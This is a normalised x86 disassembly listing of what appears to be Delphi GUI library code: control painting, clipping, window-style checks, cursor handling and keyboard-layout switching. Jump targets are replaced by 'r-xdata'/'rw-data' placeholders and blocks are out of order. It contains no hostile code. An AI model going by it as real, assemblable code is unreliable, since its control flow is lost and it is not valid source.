mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4143bc
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_446b90
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_414418
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4143bc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412f04
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4143bc
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41cd14
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412f04
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41cd14
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412f04
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_440e8c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_443750
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_446dc0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_440e8c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_448d84
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_448d84
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_443750
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_443750
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_440e8c
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_446dc0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4143bc
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_446f14
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446a38
jmp r-xdata
mov eax ebx
call sub_445ab4
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447066
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_448d84
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_443750
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_446f14
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_448d84
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_447074
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447094
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447108
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447128
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447148
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44716c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447190
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4471b4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_446a04
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4471d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_436540
mov edi eax
mov eax edi
call sub_436620
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41d9fc
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_448d84
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_4367b8
jmp r-xdata
sub_447260
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_444084
test bl bl
je r-xdata
mov eax edi
call sub_449094
mov eax edi
call sub_448c8c
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_448c8c
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_447320
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_443ce0
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_447370
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449094
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_445644
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403540
sub_4473b8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_442094
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_446670
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462c9c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46113c
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_447508
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4475e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4475ee
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_448d84
mov dl [ ebx + 0x184 ]
call sub_44da28
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4610b4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408090
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460eb4
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460eb4
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460eb4
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_4475f4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44767e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447685
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4610b4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408090
test eax eax
je r-xdata
mov eax ebx
call sub_448d84
mov dl 0x1
call sub_44da0c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_4476e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412ef4
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_443750
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_447730
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_447764
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403540
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403540
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4477a4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_443750
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4477fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a2b8
mov edx [ r-xdata ]
call sub_4034f4
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_447834
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4143bc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_447858
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_448d84
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_4478b4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_447820
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4143bc
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_4478f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4057f8
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4057f8
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_447960
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_447a08
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447a0f
lea eax [ ebp - 0x4 ]
call sub_4057e0
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_4401fc
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403344
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4057e0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403540
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4057f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ edi + 0x178 ] eax
sub_447a18
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_44561c
xor edx edx
push ebp
push sub_447ada
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403540
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ae1
mov eax [ ebp - 0x4 ]
call sub_445624
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_447ae1
mov eax [ ebp - 0x4 ]
call sub_45a2f0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4427b0
sub_447b2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40328c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444410
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_447b96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_4427b0
sub_447bb0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_447bd8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45a2f0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45a1f8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403540
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_447bd8
test al al
jne r-xdata
sub_447c40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447bd8
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_449ef0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447c6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447bd8
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_449ef0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_447c98
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_447cc0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45a2f0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45a1f8
mov [ esp ] al
